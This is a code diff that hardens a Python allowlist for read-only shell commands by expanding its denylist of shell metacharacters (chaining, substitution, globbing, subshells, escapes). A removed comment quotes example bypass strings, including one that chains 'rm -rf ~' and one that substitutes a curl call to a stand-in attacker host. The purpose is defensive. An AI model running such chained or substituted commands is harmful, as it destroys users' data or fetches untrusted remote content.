@@ -132,12 +132,18 @@ def _run_tokens(command: str) -> list[str]:
         return [command]
 
 
-# Shell metacharacters that allow command chaining / substitution / redirection.
-# Read tier later runs the original string via shell=True, so allowlisting the
-# leading tokens is not enough — we have to also reject any string containing
-# these. Without this guard, `git log && rm -rf ~` and `cat $(curl evil.com)`
-# both pass the prefix check.
-_READ_TIER_SHELL_METACHARS = (";", "&&", "||", "|", "$(", "`", ">", "<", "\n", "\r")
+# Shell metacharacters that allow command chaining / substitution / redirection /
+# backgrounding / globbing. Read tier runs the original string via shell=True so
+# allowlisting the leading tokens is not enough — any of these in the command
+# enables an escape. Single `&` covers `&&` (job-background also a chain); single
+# `|` covers `||` (pipe also alternation). Parens enable subshells. Glob chars
+# enable filename expansion outside the allowlist. Tilde + backslash enable home
+# expansion + escape sequences. Newlines split commands.
+_READ_TIER_SHELL_METACHARS = (
+    ";", "&", "|", "$(", "`", ">", "<",
+    "(", ")", "*", "?", "[", "]", "{", "}", "~", "\\",
+    "\n", "\r",
+)
 
 
 def _is_allowed_read_command(command: str) -> bool:
